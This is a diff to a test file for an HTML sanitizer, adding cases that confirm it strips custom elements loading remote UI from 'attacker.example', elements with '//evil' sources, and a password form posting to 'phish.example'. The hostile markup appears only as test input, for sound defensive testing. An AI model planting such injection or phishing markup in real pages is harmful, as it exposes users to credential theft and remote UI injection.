@@ -17,10 +17,34 @@ describe('sanitizeHtml (HTML sinks fed with data: header texts, texts, html cell
         expect(out).not.toMatch(/onerror|<script|javascript:/i)
     })
 
-    it('keeps custom elements but drops their on… attributes', () => {
+    it('keeps an allow-listed custom element (vaadin-icon) but drops its on… attributes', () => {
         const out = sanitizeHtml('<vaadin-icon icon="vaadin:check" onclick="x()"></vaadin-icon>')
         expect(out).toContain('<vaadin-icon icon="vaadin:check">')
         expect(out).not.toContain('onclick')
+    })
+
+    it('drops a <mateu-ux> pointing at another origin (B1: credentials + remote UI injection)', () => {
+        const out = sanitizeHtml('Mug <mateu-ux baseurl="https://attacker.example" route="pwned" '
+            + 'consumedroute="y" id="z"></mateu-ux><mateu-ui baseurl="https://attacker.example"></mateu-ui>')
+        expect(out).not.toMatch(/mateu-ux|mateu-ui|attacker/i)
+        expect(out).toContain('Mug')
+    })
+
+    it('drops every custom element that is not allow-listed, and unknown attributes of an allowed one', () => {
+        const out = sanitizeHtml('<x-widget src="//evil"></x-widget><mateu-drawer opened></mateu-drawer>'
+            + '<vaadin-grid items="x"></vaadin-grid><vaadin-icon icon="vaadin:user" src="//evil/i.svg"></vaadin-icon>'
+            + '<div is="mateu-ux"></div>')
+        // (DOMPurify empties a customised built-in's `is` instead of removing it: inert)
+        expect(out).not.toMatch(/x-widget|mateu-drawer|vaadin-grid|evil|mateu-ux/)
+        expect(out).toContain('<vaadin-icon icon="vaadin:user">')
+    })
+
+    it('drops form controls (no credential-harvesting form from a value)', () => {
+        const out = sanitizeHtml('<form action="https://phish.example"><input type="password" name="p">'
+            + '<button formaction="https://phish.example">Go</button><select><option>a</option></select>'
+            + '<textarea>t</textarea></form><b>kept</b>')
+        expect(out).not.toMatch(/<form|<input|<button|<select|<option|<textarea|formaction|phish/i)
+        expect(out).toContain('<b>kept</b>')
     })
 
     it('sanitizes a header title whose interpolated data carries markup', () => {
